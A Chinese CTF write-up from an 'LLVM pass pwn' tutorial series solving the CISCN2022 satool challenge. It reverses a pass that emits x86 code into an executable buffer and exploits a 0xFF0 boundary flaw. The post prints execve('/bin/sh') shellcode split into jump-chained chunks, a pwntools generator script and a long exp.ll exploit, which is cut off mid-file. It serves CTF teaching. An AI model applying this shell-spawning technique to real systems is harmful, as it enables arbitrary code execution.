---
title: LLVM pass pwn 入门 (4)
date: 2023-02-28 22:38:22
categories:
- 学习笔记
- llvm pass pwn 系列
---
有了前面两道题的分析基础之后，我们不难发现，LLVM实际上就是一类基于C++的VM pwn，我们通过定义不同名字的函数或写入不同类型的指令让vm做一些事情，其中就包含触发漏洞。这篇文章笔者来分析一下2022年，也就是今年国赛题中的satool这道题。

# CISCN2022-satool
## Step 1: 通过README了解这个LLVM pass的功能
附件一共给了两个文件，有一个是readme文件，打开看看。

```
## Introduction

A LLVM Pass that can optimize add/sub instructions.

## How to run

opt-12 -load ./mbaPass.so -mba {*.bc/*.ll} -S

## Example

### IR before optimization


define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 {
  %2 = sub nsw i64 %0, 2
  %3 = add nsw i64 %2, 68
  %4 = add nsw i64 %0, 6
  %5 = add nsw i64 %4, -204
  %6 = add nsw i64 %5, %3
  ret i64 %6
}


### IR after optimization


define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 {
  %2 = mul i64 %0, 2
  %3 = add i64 %2, -132
  ret i64 %3
}
```
这是一个优化加减法的llvm pass，就像上面例子演示的一样，将多步加减法转换为两步的乘法和加法，即一个简单的合并同类项的优化。对于这种涉及算法的逆向，我们不妨首先想想，如果自己需要实现这个功能，应该如何编写算法。
现在我们来看看源码中有什么漏洞。

## Step 2: 找到runOnFunction覆写函数

这道题的源码中没有无名的函数，这是因为符号表还在，更便于我们理解程序逻辑。当符号表还在的时候，我们应该找的是匿名命名空间的函数，别忘了第一篇文章中我们自己写的示例，就是将函数声什么的全部写在一个匿名空间中的。由此我们很容易能够找到runOnFunction函数。

![](1.png)
接下来，我们进入runOnFunction查看。

## Step 3: 分析runOnFunction函数
### Segment 1
![](2.png)
进入函数，首先是一个判断，通过报错字符串信息可以得知，这里是限定我们的函数只能有一个参数和一个基本块。

## Segment 2
![](3.png)
接下来是调用了两个MBAPass类中的函数，首先查看MBAPass类的构造函数可知，this+4指针指向了一个mmap空间，大小为0x1000。首先其将这块内存的权限改为可写可执行，然后执行了handle函数，之后再将权限改为可读可执行，执行callCode函数。我们还是首先看下这两个函数的执行流程。

## Step 4: 分析handle函数
handle函数传入的第一个参数是MBAPass对象自身，第二个参数v29是llvm.Function指针。打开handle一看，好家伙这么多代码，一点点分析。

### Segment 1
![](4.png)
猜测：v29是第一个基本块，Terminator是结束符的意思，暂时还不清楚到底指什么，Operand是操作数。
### Segment 2
![](5.png)
注意**这里的llvm::isa**相当于Java中的instanceof关键字，判断Operand是否是llvm::constant的实例。如果是，说明这个操作数是一个常量数值，随后将其转换为整型常量并有符号扩展。然后调用了他自己定义的函数writeMovImm64。这个函数的功能是构建机器码指令，一开始想查Intel手册发现看不懂，后来直接用反汇编才试出来。**writeMovImm64的功能是：当第二个参数为0时，向事先mmap的空间中写入"mov rbx, <第三个参数>"指令，若第二个参数不为0则写入"mov rax, <第三个参数>指令"。这两个指令都占10字节，写入完毕后指针后移10准备下一次写入。同理可以试出来writeRet函数就是写入一个"ret"指令**。基于此我们也可以知道this+5这个指针的作用，其是用来作为mmap空间的游标使用的，在指针指向的位置写入指令。
![](6.png)
### Segment 3
![](7.png)
这里判断操作数是否是函数的参数。然后写入"mov rbx, 0; ret"指令。
### Segment 4
![](8.png)
如果操作数既不是立即数，又不是参数，那可能是局部变量。在else语句块中首先实例化了两个STL stack对象，分别为v25和v26变量，然后进行了push操作。如果写入指针的游标大于v30，就直接写入一个ret指令返回（**v30=mmap内存起始地址+0xFF0，记住这个0xFF0，后面有关键作用**）。

### Segment 5
![](9.png)
再次之后弹出了两个栈顶的东西，其中将先弹出的转化为了二元运算符对象，当转换出错时还会报错。说明位于栈顶的应该是一个二元运算符。
### Segment 6
![](10.png)
后面就开始判断运算符的种类了。还记得运算符的种类应该在哪一个文件里面查询吗？``llvm/IR/Instructions.def``！查询到13表示的是加法，15表示的是减法。这里的意思是二元运算符只能是加或减，否则报错退出。
### Segment 7
![](11.png)
这里的v20和v19容易猜出来就是二元运算符的两个操作数。

后面首先判断v20是否是常量。如果是则判断其值是否为1或-1。若是则调用writeInc函数写入"inc rax"或"dec rax"指令，若不是则调用writeOpReg函数写入"add rax, rbx"指令（第二个参数是1。若第二个参数为0就是"sub rax, rbx"指令）。

如果v20是参数，则在this+12处加上v22。至于this+22是什么尚且不清楚，后面再行判断。

如果既不是常量也不是参数，则push压栈。通过栈后面的类型可以知道，v25中的值一定都是整数，而v26中的值是对象，其可以表示变量也可以表示一个常量。

### Segment 8
![](12.png)
handle函数的最后一个部分，和Segment 7相同，Segment 7处理的是加减法的第一个操作数，而Segment 8以同样的方式处理第二个操作数。不过在此之前有一个判断符号的if语句，当运算为减的时候会将v22取相反数。

看到这里，我们已经对handle函数有了一些初步的了解，但是在细节方面的理解还是不够透彻。因此我们来尝试写一个函数，看看handle函数处理的全过程到底是什么样的。

这是根据readme函数改编的一段代码，只有后面的数值修改了（注意本题的.ll文件不能通过clang生成，因为clang生成的.ll代码会有一些store等其他指令的存在，mbapass无法识别）。我们下断点到stack析构函数调用的地方，也就是handle函数的末尾，看一下此时this+4这个mmap空间的情况。

```
; ModuleID = 'test.c'
source_filename = "test.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @test(i64 %0) #0 {
  %2 = sub nsw i64 %0, 285912734
  %3 = add nsw i64 %2, 685392891
  %4 = add nsw i64 %0, 653902180
  %5 = add nsw i64 %4, -204343281
  %6 = add nsw i64 %5, %3
  ret i64 %6
}

attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"}
```
下面是mmap空间的情况：
![](13.png)
可以看出handle函数将我们的5行代码转换为了汇编指令保存。和静态分析的结果符合、

## Step 5: 分析callCode函数，思考利用方式
![](14.png)
callCode函数很简单，就是执行刚刚写入到mmap空间的汇编指令。

由此可见，我们可以执行这一段指令。但是这里的指令只能是有限的几种，并不能达到我们的目的。不过别忘了我们第4步分析handle函数时注意到的一个小细节：当生成的汇编指令长度大于0xFF0时，handle函数不会再继续向下解析.ll代码，而是会直接退出。但很明显我们完全有可能让handle函数生成的汇编指令长度比0xFF0大几个字节，即让最后一条指令越过0xFF0的边界。注意其依然会执行。而且**mmap出来的空间没有被释放**，这说明当handle函数解析第二个函数的时候，我们之前解析得到的指令还保留在mmap空间中。如果两次解析出来的指令有错位，就可能会产生新的指令。

如第一次解析的指令为：
```
movabs rax, 0	; 0x0
movabs rax, 0x12345678	; 0xA
mov rbx, rax	; 0x14
movabs rax, 0x87654321	; 0x1E
```

第二次解析的指令为：
```
movabs rax, 0	; 0x0
movabs rax, 0x12345678	; 0xA
mov rbx, rax	; 0x14
mov rbx, rax	; 0x17
```
那么对于0x1A~0x1E这5个字节，如果有实际含义的话，很可能会被当成汇编指令执行，而这5个字节在第一次解析中是作为立即数存在，是可以被我们随意控制的。由此我们就可以执行一条长度不大于5字节的任意指令。不过需要注意的是，如果我们写的汇编指令长度不足0xFF0字节，在循环中会写入一个ret指令进去，跳出循环的条件就是汇编指令长度大于0xFF0，因此要想循环中添加ret指令的这个函数不调用，就必须要使得写入的汇编指令长度大于0xFF0字节，这样才能够执行0xFF0后面几个字节的任意代码。

通过测试我们可以发现，inc指令占用3字节，mov rax, rbx指令占用3字节，向rax或rbx直接赋值占用10字节。由于3和10的最大公因数为1，因此我们可以构造任意长度在0xFF0左右的汇编代码。但是很明显，不可能有shellcode能够用仅仅几个字节就getshell。考虑到我们可以控制movabs指令中的后8字节，可以将shellcode写到这一个个的8字节之中，再通过短转移指令将它们连接在一起，就有可能执行一个完整的shellcode。**注意：短转移指令的长度为2字节，因此每一个8字节中的指令不能超过6字节。因此现有的shellcode可能无法直接使用，需要我们根据实际的调试结果进行一定的调整。**

为了shellcode编写的方便，我们将movabs指令作为我们写入的主要指令。通过前面的调试结果可以得知，绝大多数的movabs指令后面都回跟上一个add rax, rbx指令。我们人为规定每一个movabs中写入一条指令，然后通过短转移指令跳到前面一个movabs中的指令。

下面，我们就来构造我们预期要执行的shellcode。

## Step 6: 构造shellcode
我们直接使用pwntools中给出的模板，在其基础上进行修改。
```asm
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```
1. ``push 0x68``：机器码``jh``，占用2字节。
2. ``mov rax, 0x732f2f2f6e69622f``：占用10字节，进行改写：
	(1) ``mov eax, 0x732f2f2f``：机器码``\xb8///s``，占用5字节。
	(2) ``shl rax, 32``：机器码``H\xc1\xe0<space>``，占用4字节（\<space\>指空格）。
	(3) ``add rax, 0x6e69622f``：机器码``H\x05/bin``，占用6字节。
3. ``push rax``：机器码``P``，占用1字节。
4. ``mov rdi, rsp``：机器码``H\x89\xe7``，占用3字节。
5. ``push 0x1010101 ^ 0x6873``：机器码``hri\x01\x01``，但其与下一步可以合并：
	``push 0x6873``：机器码``hsh\x00\x00``，占用5字节。
6. ``xor esi, esi``：机器码``1\xf6``，占用2字节。
7. ``push rsi``：机器码``V``，占用1字节。
8. ``push 8``：机器码``j\x08``，占用2字节。
9. ``pop rsi``：机器码``^``，占用1字节。
10. ``add rsi, rsp``：机器码``H\x01\xe6``，占用3字节。
11. ``push rsi``：机器码``V``，占用1字节。
12. ``mov rsi, rsp``：机器码``H\x89\xe6``，占用3字节。
13. ``xor edx, edx``：机器码``1\xd2``，占用2字节。
14. ``push SYS_execve``：机器码``j;``，占用2字节。
15. ``pop rax``：机器码``X``，占用1字节。
16. ``syscall``：机器码``\x0f\x05``，占用2字节。

机器码分析完毕。我们发现有一些指令很短，可以几条合并。如3和4合并、6和7和8和9合并、10和11合并、12和13合并、14和15和16合并。但是为了批量生成指令机器码的方便，每个8字节中只填充一个shellcode指令。我们让短转移指令固定在最后2字节，前面的指令不够6字节的使用nop指令补充。我们使用脚本尝试生成一下：

```python
from pwn import *
context.arch='amd64'

shellcode = [
			 "push 0x68",
	     	 "mov eax, 0x732f2f2f",
	     	 "shl rax, 32",
	     	 "add rax, 0x6e69622f",
	     	 "push rax",
	     	 "mov rdi, rsp",
	     	 "push 0x6873",
	     	 "xor esi, esi",
	     	 "push rsi",
	     	 "push 8",
	     	 "pop rsi",
	     	 "add rsi, rsp",
	     	 "push rsi",
	     	 "mov rsi, rsp",
	     	 "xor edx, edx",
	     	 "push SYS_execve",
	     	 "pop rax",
	     	 "syscall"
	     	]

for code in shellcode:
	bytes = asm(code).ljust(6, b'\x90') + b'\xEB\xE9'	# \xEB\xEB: jmp short ptr -21, 思考一下-21这个数是怎么得出来的
	print(u64(bytes))
```

输出结果：

```
16999840169015142506
16999840042827329464
16999840167141359944
16999802617337939272
16999840169015152720
16999840169020852552
16999839548121314152
16999840169015178801
16999840169015152726
16999840169015117930
16999840169015152734
16999840169020752200
16999840169015152726
16999840169020787016
16999840169015169585
16999840169015130986
16999840169015152728
16999840169015117071
```

接下来，我们要进行调试，构造出能够产生jmp指令两个长函数以供handle函数解析。

## Step 7: getshell
我们在一个函数中写入很多的add指令，就像下面这样。经过测试得出=，当写到%315时，有一个movabs指令能够成功溢出到0xFF0之后，不过这是第一条指令。因此我们写shellcode应该写在前面几个指令中。
![](15.png)
下面是解析第一个函数后最后几个字节的情况：
![](16.png)
下面是解析第二个函数后最后几个字节的情况：
![](17.png)
由下图可以得出，我们可以控制的是第一个函数最后一个movabs中最后的4个字节：
![](18.png)
根据下图可知，第一个短转移（即图中的jmp）偏移应该为：``-(0xff3-(0xfde+2))=-0x13=0xed``
![](19.png)
如图所示，这样就可以跳转到我们的第一个shellcode了。第一个立即数的值应该为``0xEDEB00000000``。（低4字节无所谓）
![](20.png)
然后我们只要将上面脚本中的值依次写入到下面即可。
![](21.png)
成功getshell。
![](22.png)
exp.ll如下：

```
; ModuleID = 'test.c'
source_filename = "test.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i64 @test(i64 %0) #0 {
  %2 = add nsw i64 %0, 261593573097472
  %3 = add nsw i64 %2, 256
  %4 = add nsw i64 %3, 256
  %5 = add nsw i64 %4, 256
  %6 = add nsw i64 %5, 256
  %7 = add nsw i64 %6, 256
  %8 = add nsw i64 %7, 256
  %9 = add nsw i64 %8, 256
  %10 = add nsw i64 %9, 256
  %11 = add nsw i64 %10, 256
  %12 = add nsw i64 %11, 256
  %13 = add nsw i64 %12, 256
  %14 = add nsw i64 %13, 256
  %15 = add nsw i64 %14, 256
  %16 = add nsw i64 %15, 256
  %17 = add nsw i64 %16, 256
  %18 = add nsw i64 %17, 256
  %19 = add nsw i64 %18, 256
  %20 = add nsw i64 %19, 256
  %21 = add nsw i64 %20, 256
  %22 = add nsw i64 %21, 256
  %23 = add nsw i64 %22, 256
  %24 = add nsw i64 %23, 256
  %25 = add nsw i64 %24, 256
  %26 = add nsw i64 %25, 256
  %27 = add nsw i64 %26, 256
  %28 = add nsw i64 %27, 256
  %29 = add nsw i64 %28, 256
  %30 = add nsw i64 %29, 256
  %31 = add nsw i64 %30, 256
  %32 = add nsw i64 %31, 256
  %33 = add nsw i64 %32, 256
  %34 = add nsw i64 %33, 256
  %35 = add nsw i64 %34, 256
  %36 = add nsw i64 %35, 256
  %37 = add nsw i64 %36, 256
  %38 = add nsw i64 %37, 256
  %39 = add nsw i64 %38, 256
  %40 = add nsw i64 %39, 256
  %41 = add nsw i64 %40, 256
  %42 = add nsw i64 %41, 256
  %43 = add nsw i64 %42, 256
  %44 = add nsw i64 %43, 256
  %45 = add nsw i64 %44, 256
  %46 = add nsw i64 %45, 256
  %47 = add nsw i64 %46, 256
  %48 = add nsw i64 %47, 256
  %49 = add nsw i64 %48, 256
  %50 = add nsw i64 %49, 256
  %51 = add nsw i64 %50, 256
  %52 = add nsw i64 %51, 256
  %53 = add nsw i64 %52, 256
  %54 = add nsw i64 %53, 256
  %55 = add nsw i64 %54, 256
  %56 = add nsw i64 %55, 256
  %57 = add nsw i64 %56, 256
  %58 = add nsw i64 %57, 256
  %59 = add nsw i64 %58, 256
  %60 = add nsw i64 %59, 256
  %61 = add nsw i64 %60, 256
  %62 = add nsw i64 %61, 256
  %63 = add nsw i64 %62, 256
  %64 = add nsw i64 %63, 256
  %65 = add nsw i64 %64, 256
  %66 = add nsw i64 %65, 256
  %67 = add nsw i64 %66, 256
  %68 = add nsw i64 %67, 256
  %69 = add nsw i64 %68, 256
  %70 = add nsw i64 %69, 256
  %71 = add nsw i64 %70, 256
  %72 = add nsw i64 %71, 256
  %73 = add nsw i64 %72, 256
  %74 = add nsw i64 %73, 256
  %75 = add nsw i64 %74, 256
  %76 = add nsw i64 %75, 256
  %77 = add nsw i64 %76, 256
  %78 = add nsw i64 %77, 256
  %79 = add nsw i64 %78, 256
  %80 = add nsw i64 %79, 256
  %81 = add nsw i64 %80, 256
  %82 = add nsw i64 %81, 256
  %83 = add nsw i64 %82, 256
  %84 = add nsw i64 %83, 256
  %85 = add nsw i64 %84, 256
  %86 = add nsw i64 %85, 256
  %87 = add nsw i64 %86, 256
  %88 = add nsw i64 %87, 256
  %89 = add nsw i64 %88, 256
  %90 = add nsw i64 %89, 256
  %91 = add nsw i64 %90, 256
  %92 = add nsw i64 %91, 256
  %93 = add nsw i64 %92, 256
  %94 = add nsw i64 %93, 256
  %95 = add nsw i64 %94, 256
  %96 = add nsw i64 %95, 256
  %97 = add nsw i64 %96, 256
  %98 = add nsw i64 %97, 256
  %99 = add nsw i64 %98, 256
  %100 = add nsw i64 %99, 256
  %101 = add nsw i64 %100, 256
  %102 = add nsw i64 %101, 256
  %103 = add nsw i64 %102, 256
  %104 = add nsw i64 %103, 256
  %105 = add nsw i64 %104, 256
  %106 = add nsw i64 %105, 256
  %107 = add nsw i64 %106, 256
  %108 = add nsw i64 %107, 256
  %109 = add nsw i64 %108, 256
  %110 = add nsw i64 %109, 256
  %111 = add nsw i64 %110, 256
  %112 = add nsw i64 %111, 256
  %113 = add nsw i64 %112, 256
  %114 = add nsw i64 %113, 256
  %115 = add nsw i64 %114, 256
  %116 = add nsw i64 %115, 256
  %117 = add nsw i64 %116, 256
  %118 = add nsw i64 %117, 256
  %119 = add nsw i64 %118, 256
  %120 = add nsw i64 %119, 256
  %121 = add nsw i64 %120, 256
  %122 = add nsw i64 %121, 256
  %123 = add nsw i64 %122, 256
  %124 = add nsw i64 %123, 256
  %125 = add nsw i64 %124, 256
  %126 = add nsw i64 %125, 256
  %127 = add nsw i64 %126, 256
  %128 = add nsw i64 %127, 256
  %129 = add nsw i64 %128, 256
  %130 = add nsw i64 %129, 256
  %131 = add nsw i64 %130, 256
  %132 = add nsw i64 %131, 256
  %133 = add nsw i64 %132, 256
  %134 = add nsw i64 %133, 256
  %135 = add nsw i64 %134, 256
  %136 = add nsw i64 %135, 256
  %137 = add nsw i64 %136, 256
  %138 = add nsw i64 %137, 256
  %139 = add nsw i64 %138, 256
  %140 = add nsw i64 %139, 256
  %141 = add nsw i64 %140, 256
  %142 = add nsw i64 %141, 256
  %143 = add nsw i64 %142, 256
  %144 = add nsw i64 %143, 256
  %145 = add nsw i64 %144, 256
  %146 = add nsw i64 %145, 256
  %147 = add nsw i64 %146, 256
  %148 = add nsw i64 %147, 256
  %149 = add nsw i64 %148, 256
  %150 = add nsw i64 %149, 256
  %151 = add nsw i64 %150, 256
  %152 = add nsw i64 %151, 256
  %153 = add nsw i64 %152, 256
  %154 = add nsw i64 %153, 256
  %155 = add nsw i64 %154, 256
  %156 = add nsw i64 %155, 256
  %157 = add nsw i64 %156, 256
  %158 = add nsw i64 %157, 256
  %159 = add nsw i64 %158, 256
  %160 = add nsw i64 %159, 256
  %161 = add nsw i64 %160, 256
  %162 = add nsw i64 %161, 256
  %163 = add nsw i64 %162, 256
  %164 = add nsw i64 %163, 256
  %165 = add nsw i64 %164, 256
  %166 = add nsw i64 %165, 256
  %167 = add nsw i64 %166, 256
  %168 = add nsw i64 %167, 256
  %169 = add nsw i64 %168, 256
  %170 = add nsw i64 %169, 256
  %171 = add nsw i64 %170, 256
  %172 = add nsw i64 %171, 256
  %173 = add nsw i64 %172, 256
  %174 = add nsw i64 %173, 256
  %175 = add nsw i64 %174, 256
  %176 = add nsw i64 %175, 256
  %177 = add nsw i64 %176, 256
  %178 = add nsw i64 %177, 256
  %179 = add nsw i64 %178, 256
  %180 = add nsw i64 %179, 256
  %181 = add nsw i64 %180, 256
  %182 = add nsw i64 %181, 256
  %183 = add nsw i64 %182, 256
  %184 = add nsw i64 %183, 256
  %185 = add nsw i64 %184, 256
  %186 = add nsw i64 %185, 256
  %187 = add nsw i64 %186, 256
  %188 = add nsw i64 %187, 256
  %189 = add nsw i64 %188, 256
  %190 = add nsw i64 %189, 256
  %191 = add nsw i64 %190, 256
  %192 = add nsw i64 %191, 256
  %193 = add nsw i64 %192, 256
  %194 = add nsw i64 %193, 256
  %195 = add nsw i64 %194, 256
  %196 = add nsw i64 %195, 256
  %197 = add nsw i64 %196, 256
  %198 = add nsw i64 %197, 256
  %199 = add nsw i64 %198, 256
  %200 = add nsw i64 %199, 256
  %201 = add nsw i64 %200, 256
  %202 = add nsw i64 %201, 256
  %203 = add nsw i64 %202, 256
  %204 = add nsw i64 %203, 256
  %205 = add nsw i64 %204, 256
  %206 = add nsw i64 %205, 256
  %207 = add nsw i64 %206, 256
  %208 = add nsw i64 %207, 256
  %209 = add nsw i64 %208, 256
  %210 = add nsw i64 %209, 256
  %211 = add nsw i64 %210, 256
  %212 = add nsw i64 %211, 256
  %213 = add nsw i64 %212, 256
  %214 = add nsw i64 %213, 256
  %215 = add nsw i64 %214, 256
  %216 = add nsw i64 %215, 256
  %217 = add nsw i64 %216, 256
  %218 = add nsw i64 %217, 256
  %219 = add nsw i64 %218, 256
  %220 = add nsw i64 %219, 256
  %221 = add nsw i64 %220, 256
  %222 = add nsw i64 %221, 256
  %223 = add nsw i64 %222, 256
  %224 = add nsw i64 %223, 256
  %225 = add nsw i64 %224, 256
  %226 = add nsw i64 %225, 256
  %227 = add nsw i64 %226, 256
  %228 = add nsw i64 %227, 256
  %229 = add nsw i64 %228, 256
  %230 = add nsw i64 %229, 256
  %231 = add nsw i64 %230, 256
  %232 = add nsw i64 %231, 256
  %233 = add nsw i64 %232, 256
  %234 = add nsw i64 %233, 256
  %235 = add nsw i64 %234, 256
  %236 = add nsw i64 %235, 256
  %237 = add nsw i64 %236, 256
  %238 = add nsw i64 %237, 256
  %239 = add nsw i64 %238, 256
  %240 = add nsw i64 %239, 256
  %241 = add nsw i64 %240, 256
  %242 = add nsw i64 %241, 256
  %243 = add nsw i64 %242, 256
  %244 = add nsw i64 %243, 256
  %245 = add nsw i64 %244, 256
  %246 = add nsw i64 %245, 256
  %247 = add nsw i64 %246, 256
  %248 = add nsw i64 %247, 256
  %249 = add nsw i64 %248, 256
  %250 = add nsw i64 %249, 256
  %251 = add nsw i64 %250, 256
  %252 = add nsw i64 %251, 256
  %253 = add nsw i64 %252, 256
  %254 = add nsw i64 %253, 256
  %255 = add nsw i64 %254, 256
  %256 = add nsw i64 %255, 256
  %257 = add nsw i64 %256, 256
  %258 = add nsw i64 %257, 256
  %259 = add nsw i64 %258, 256
  %260 = add nsw i64 %259, 256
  %261 = add nsw i64 %260, 256
  %262 = add nsw i64 %261, 256
  %263 = add nsw i64 %262, 256
  %264 = add nsw i64 %263, 256
  %265 = add nsw i64 %264, 256
  %266 = add nsw i64 %265, 256
  %267 = add nsw i64 %266, 256
  %268 = add nsw i64 %267, 256
  %269 = add nsw i64 %268, 256
  %270 = add nsw i64 %269, 256
  %271 = add nsw i64 %270, 256
  %272 = add nsw i64 %271, 256
  %273 = add nsw i64 %272, 256
  %274 = add nsw i64 %273, 256
  %275 = add nsw i64 %274, 256
  %276 = add nsw i64 %275, 256
  %277 = add nsw i64 %276, 256
  %278 = add nsw i64 %277, 256
  %279 = add nsw i64 %278, 256
  %280 = add nsw i64 %279, 256
  %281 = add nsw i64 %280, 256
  %282 = add nsw i64 %281, 256
  %283 = add nsw i64 %282, 256
  %284 = add nsw i64 %283, 256
  %285 = add nsw i64 %284, 256
  %286 = add nsw i64 %285, 256
  %287 = add nsw i64 %286, 256
  %288 = add nsw i64 %287, 256
  %289 = add nsw i64 %288, 256
  %290 = add nsw i64 %289, 256
  %291 = add nsw i64 %290, 256
  %292 = add nsw i64 %291, 256
  %293 = add nsw i64 %292, 256
  %294 = add nsw i64 %293, 256
  %295 = add nsw i64 %294, 256
  %296 = add nsw i64 %295, 256
  %297 = add nsw i64 %296, 256
  %298 = add nsw i64 %297, 256
  %299 = add nsw i64 %298, 256
  %300 = add nsw i64 %299, 256
  %301 = add nsw i64 %300, 256
  %302 = add nsw i64 %301, 256
  %303 = add nsw i64 %302, 256
  %304 = add nsw i64 %303, 256
  %305 = add nsw i64 %304, 256
  %306 = add nsw i64 %305, 256
  %307 = add nsw i64 %306, 256
  %308 = add nsw i64 %307, 256
  %309 = add nsw i64 %308, 256
  %310 = add nsw i64 %309, 256
  %311 = add nsw i64 %310, 256
  %312 = add nsw i64 %311, 256
  %313 = add nsw i64 %312, 256
  %314 = add nsw i64 %313, 1
  %315 = add nsw i64 %314, 1
  %316 = add nsw i64 %315, 1
  %317 = add nsw i64 %316, 256
  ret i64 %317
}

define dso_local i64 @test2(i64 %0) #0 {
  %2 = sub nsw i64 %0, 1
  %3 = add nsw i64 %2, 1
  %4 = add nsw i64 %3, 1
  %5 = add nsw i64 %4, 16999840169015142506
  %6 = add nsw i64 %5, 16999840042827329464
  %7 = add nsw i64 %6, 16999840167141359944
  %8 = add nsw i64 %7, 16999802617337939272
  %9 = add nsw i64 %8, 16999840169015152720
  %10 = add nsw i64 %9, 16999840169020852552
  %11 = add nsw i64 %10, 16999839548121314152
  %12 = add nsw i64 %11, 16999840169015178801
  %13 = add nsw i64 %12, 16999840169015152726
  %14 = add nsw i64 %13, 16999840169015117930
  %15 = add nsw i64 %14, 16999840169015152734
  %16 = add nsw i64 %15, 16999840169020752200
  %17 = add nsw i64 %16, 16999840169015152726
  %18 = add nsw i64 %17, 16999840169020787016
  %19 = add nsw i64 %18, 16999840169015169585
  %20 = add nsw i64 %19, 16999840169015130986
  %21 = add nsw i64 %20, 16999840169015152728
  %22 = add nsw i64 %21, 16999840169015117071
  %23 = add nsw i64 %22, 256
  %24 = add nsw i64 %23, 256
  %25 = add nsw i64 %24, 256
  %26 = add nsw i64 %25, 256
  %27 = add nsw i64 %26, 256
  %28 = add nsw i64 %27, 256
  %29 = add nsw i64 %28, 256
  %30 = add nsw i64 %29, 256
  %31 = add nsw i64 %30, 256
  %32 = add nsw i64 %31, 256
  %33 = add nsw i64 %32, 256
  %34 = add nsw i64 %33, 256
  %35 = add nsw i64 %34, 256
  %36 = add nsw i64 %35, 256
  %37 = add nsw i64 %36, 256
  %38 = add nsw i64 %37, 256
  %39 = add nsw i64 %38, 256
  %40 = add nsw i64 %39, 256
  %41 = add nsw i64 %40, 256
  %42 = add nsw i64 %41, 256
  %43 = add nsw i64 %42, 256
  %44 = add nsw i64 %43, 256
  %45 = add nsw i64 %44, 256
  %46 = add nsw i64 %45, 256
  %47 = add nsw i64 %46, 256
  %48 = add nsw i64 %47, 256
  %49 = add nsw i64 %48, 256
  %50 = add nsw i64 %49, 256
  %51 = add nsw i64 %50, 256
  %52 = add nsw i64 %51, 256
  %53 = add nsw i64 %52, 256
  %54 = add nsw i64 %53, 256
  %55 = add nsw i64 %54, 256
  %56 = add nsw i64 %55, 256
  %57 = add nsw i64 %56, 256
  %58 = add nsw i64 %57, 256
  %59 = add nsw i64 %58, 256
  %60 = add nsw i64 %59, 256
  %61 = add nsw i64 %60, 256
  %62 = add nsw i64 %61, 256
  %63 = add nsw i64 %62, 256
  %64 = add nsw i64 %63, 256
  %65 = add nsw i64 %64, 256
  %66 = add nsw i64 %65, 256
  %67 = add nsw i64 %66, 256
  %68 = add nsw i64 %67, 256
  %69 = add nsw i64 %68, 256
  %70 = add nsw i64 %69, 256
  %71 = add nsw i64 %70, 256
  %72 = add nsw i64 %71, 256
  %73 = add nsw i64 %72, 256
  %74 = add nsw i64 %73, 256
  %75 = add nsw i64 %74, 256
  %76 = add nsw i64 %75, 256
  %77 = add nsw i64 %76, 256
  %78 = add nsw i64 %77, 256
  %79 = add nsw i64 %78, 256
  %80 = add nsw i64 %79, 256
  %81 = add nsw i64 %80, 256
  %82 = add nsw i64 %81, 256
  %83 = add nsw i64 %82, 256
  %84 = add nsw i64 %83, 256
  %85 = add nsw i64 %84, 256
  %86 = add nsw i64 %85, 256
  %87 = add nsw i64 %86, 256
  %88 = add nsw i64 %87, 256
  %89 = add nsw i64 %88, 256
  %90 = add nsw i64 %89, 256
  %91 = add nsw i64 %90, 256
  %92 = add nsw i64 %91, 256
  %93 = add nsw i64 %92, 256
  %94 = add nsw i64 %93, 256
  %95 = add nsw i64 %94, 256
  %96 = add nsw i64 %95, 256
  %97 = add nsw i64 %96, 256
  %98 = add nsw i64 %97, 256
  %99 = add nsw i64 %98, 256
  %100 = add nsw i64 %99, 256
  %101 = add nsw i64 %100, 256
  %102 = add nsw i64 %101, 256
  %103 = add nsw i64 %102, 256
  %104 = add nsw i64 %103, 256
  %105 = add nsw i64 %104, 256
  %106 = add nsw i64 %105, 256
  %107 = add nsw i64 %106, 256
  %108 = add nsw i64 %107, 256
  %109 = add nsw i64 %108, 256
  %110 = add nsw i64 %109, 256
  %111 = add nsw i64 %110, 256
  %112 = add nsw i64 %111, 256
  %113 = add nsw i64 %112, 256
  %114 = add nsw i64 %113, 256
  %115 = add nsw i64 %114, 256
  %116 = add nsw i64 %115, 256
  %117 = add nsw i64 %116, 256
  %118 = add nsw i64 %117, 256
  %119 = add nsw i64 %118, 256
  %120 = add nsw i64 %119, 256
  %121 = add nsw i64 %120, 256
  %122 = add nsw i64 %121, 256
  %123 = add nsw i64 %122, 256
  %124 = add nsw i64 %123, 256
  %125 = add nsw i64 %124, 256
  %126 = add nsw i64 %125, 256
  %127 = add nsw i64 %126, 256
  %128 = add nsw i64 %127, 256
  %129 = add nsw i64 %128, 256
  %130 = add nsw i64 %129, 256
  %131 = add nsw i64 %130, 256
  %132 = add nsw i64 %131, 256
  %133 = add nsw i64 %132, 256
  %134 = add nsw i64 %133, 256
  %135 = add nsw i64 %134, 256
  %136 = add nsw i64 %135, 256
  %137 = add nsw i64 %136, 256
  %138 = add nsw i64 %137, 256
  %139 = add nsw i64 %138, 256
